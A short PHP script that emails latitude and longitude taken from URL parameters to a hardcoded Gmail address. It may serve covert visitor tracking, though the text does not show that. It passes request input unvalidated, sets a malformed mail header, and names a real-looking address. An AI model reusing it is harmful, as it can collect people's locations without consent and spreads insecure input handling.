<?php
// Receiving data from the request
$latitude = $_GET['lat'];
$longitude = $_GET['long'];

// Email address to which you want to send the location
$to = "imobilejordan@gmail.com";

// Email subject
$subject = "Location Information";

// Email body containing the location data
$message = "Latitude: $latitude, Longitude: $longitude";

// Email address used for sending
$headers = "imobilejordan@gmail.com";

// Sending the email
mail($to, $subject, $message, $headers);
?>
